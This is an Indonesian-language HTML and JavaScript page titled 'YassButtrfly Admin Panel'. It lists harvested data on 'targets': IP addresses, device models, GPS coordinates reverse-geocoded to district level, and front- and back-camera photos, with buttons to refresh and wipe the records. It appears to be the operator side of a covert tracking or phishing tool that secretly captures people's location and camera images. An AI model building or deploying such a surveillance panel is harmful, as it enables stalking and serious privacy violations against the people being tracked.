<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YassButtrfly Admin Panel</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Courier New', Courier, monospace; }
        body { background-color: #0b0f0b; color: #00ff66; padding: 15px; }
        h1 { text-align: center; font-size: 18px; margin-bottom: 12px; text-shadow: 0 0 8px rgba(0,255,102,0.6); }
        
        .menu-tabs { display: flex; gap: 5px; margin-bottom: 15px; }
        .tab-btn { flex: 1; padding: 10px 5px; background: #050805; color: #00ff66; border: 1px solid #00ff66; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 11px; text-align: center; transition: 0.2s; }
        .tab-btn.active { background: #00ff66; color: #000; box-shadow: 0 0 10px rgba(0,255,102,0.4); }

        .action-bar { display: flex; gap: 8px; margin-bottom: 15px; }
        .btn { flex: 1; padding: 10px; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 12px; }
        .btn-refresh { background: #00ff66; color: #000; box-shadow: 0 0 8px rgba(0,255,102,0.4); }
        .btn-refresh:hover { background: #00cc55; }
        .btn-delete { background: #ff0055; color: #fff; box-shadow: 0 0 8px rgba(255,0,85,0.4); }
        .btn-delete:hover { background: #cc0044; }
        .btn-del-item { background: #550022; color: #ff5577; border: 1px solid #ff0055; padding: 5px 10px; border-radius: 3px; font-size: 10px; cursor: pointer; margin-top: 8px; }
        .btn-del-item:hover { background: #ff0055; color: #fff; }

        .section { display: none; background: rgba(10, 15, 10, 0.85); border: 1px solid #00ff66; padding: 15px; border-radius: 8px; box-shadow: 0 0 15px rgba(0, 255, 102, 0.2); }
        .section.active { display: block; }
        h2 { font-size: 14px; border-bottom: 1px dashed #00aa44; padding-bottom: 8px; margin-bottom: 10px; color: #88ffbb; }
        .item { border-bottom: 1px dotted #004422; padding: 10px 0; font-size: 12px; }
        img { max-width: 100%; border: 1px solid #00ff66; margin-top: 8px; border-radius: 4px; }
        a { color: #00ffff; }
    </style>
</head>
<body>

    <h1>YASSBUTTRFLY ADMIN PANEL</h1>

    <div class="menu-tabs">
        <button class="tab-btn active" onclick="switchTab('gps')">📍 Lokasi GPS</button>
        <button class="tab-btn" onclick="switchTab('front')">🤳 Kamera Depan</button>
        <button class="tab-btn" onclick="switchTab('back')">📸 Kamera Belakang</button>
    </div>

    <div class="action-bar">
        <button class="btn btn-refresh" onclick="loadData()">[ REFRESH ]</button>
        <button class="btn btn-delete" onclick="clearData()">[ HAPUS SEMUA DATA ]</button>
    </div>

    <div id="tab-gps" class="section active">
        <h2>📍 Riwayat Lokasi & Wilayah Target</h2>
        <div id="gps-data">Memuat data lokasi...</div>
    </div>

    <div id="tab-front" class="section">
        <h2>🤳 Galeri Kamera Depan</h2>
        <div id="front-cam">Memuat foto depan...</div>
    </div>

    <div id="tab-back" class="section">
        <h2>📸 Galeri Kamera Belakang</h2>
        <div id="back-cam">Memuat foto belakang...</div>
    </div>

    <script>
        function switchTab(tabName) {
            document.querySelectorAll('.section').forEach(sec => sec.classList.remove('active'));
            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));

            if (tabName === 'gps') {
                document.getElementById('tab-gps').classList.add('active');
                document.querySelectorAll('.tab-btn')[0].classList.add('active');
            } else if (tabName === 'front') {
                document.getElementById('tab-front').classList.add('active');
                document.querySelectorAll('.tab-btn')[1].classList.add('active');
            } else if (tabName === 'back') {
                document.getElementById('tab-back').classList.add('active');
                document.querySelectorAll('.tab-btn')[2].classList.add('active');
            }
        }

        async function getAddress(lat, lon, elementId) {
            try {
                const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=14&addressdetails=1`);
                const data = await res.json();
                if(data && data.address) {
                    const addr = data.address;
                    let negara = addr.country || '-';
                    let provinsi = addr.state || addr.region || '-';
                    let kota = addr.city || addr.town || addr.county || '-';
                    let kecamatan = addr.suburb || addr.village || addr.district || '-';
                    
                    document.getElementById(elementId).innerHTML = `
                        <b>Negara:</b> ${negara}<br>
                        <b>Provinsi:</b> ${provinsi}<br>
                        <b>Kota/Kab:</b> ${kota}<br>
                        <b>Kecamatan:</b> ${kecamatan}
                    `;
                }
            } catch(e) {
                document.getElementById(elementId).innerHTML = 'Gagal memuat detail wilayah.';
            }
        }

        async function loadData() {
            try {
                const res = await fetch('/api/get-data');
                const data = await res.json();

                let gpsHtml = '';
                if (data.locations && data.locations.length > 0) {
                    data.locations.forEach((loc, index) => {
                        let mapUrl = `https://maps.google.com/?q=${loc.lat},${loc.lon}`;
                        let regionId = `region-${index}`;
                        gpsHtml += `
                            <div class="item">
                                <b>IP:</b> ${loc.ip}<br>
                                <b>Merek HP / Device:</b> ${loc.device}<br>
                                <b>Koordinat:</b> <a href="${mapUrl}" target="_blank">${loc.lat}, ${loc.lon}</a><br>
                                <div id="${regionId}" style="margin: 5px 0; color: #ffff88;">Memuat detail wilayah...</div>
                                <b>Waktu:</b> ${loc.time}<br>
                                <button class="btn-del-item" onclick="deleteItem('location', ${index})">[ Hapus Data Ini ]</button>
                            </div>`;
                        setTimeout(() => getAddress(loc.lat, loc.lon, regionId), 2005 * index);
                    });
                } else {
                    gpsHtml = 'Belum ada data GPS masuk.';
                }
                document.getElementById('gps-data').innerHTML = gpsHtml;

                let frontHtml = '';
                let backHtml = '';
                if (data.photos && data.photos.length > 0) {
                    data.photos.forEach((photo, index) => {
                        let photoCard = `
                            <div class="item">
                                <b>IP:</b> ${photo.ip}<br>
                                <b>Merek HP / Device:</b> ${photo.device}<br>
                                <b>Waktu:</b> ${photo.time}<br>
                                <img src="/${photo.filename}"><br>
                                <button class="btn-del-item" onclick="deleteItem('photo', ${index})">[ Hapus Foto Ini ]</button>
                            </div>`;
                        if (photo.facing === 'environment') {
                            backHtml += photoCard;
                        } else {
                            frontHtml += photoCard;
                        }
                    });
                }
                document.getElementById('front-cam').innerHTML = frontHtml || 'Belum ada foto kamera depan.';
                document.getElementById('back-cam').innerHTML = backHtml || 'Belum ada foto kamera belakang.';

            } catch(e) {
                console.error(e);
            }
        }

        async function deleteItem(type, index) {
            if(confirm('Hapus item terpilih ini?')) {
                try {
                    const res = await fetch('/api/delete-item', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ type, index })
                    });
                    const result = await res.json();
                    if(result.success) {
                        loadData();
                    }
                } catch(e) {
                    alert('Gagal menghapus item.');
                }
            }
        }

        async function clearData() {
            if(confirm('Yakin ingin menghapus SEMUA riwayat data dan foto?')) {
                try {
                    const res = await fetch('/api/clear-data', { method: 'POST' });
                    const result = await res.json();
                    if(result.success) {
                        loadData();
                        alert('Semua data berhasil dibersihkan!');
                    }
                } catch(e) {
                    alert('Gagal menghapus data.');
                }
            }
        }

        loadData();
    </script>
</body>
</html>
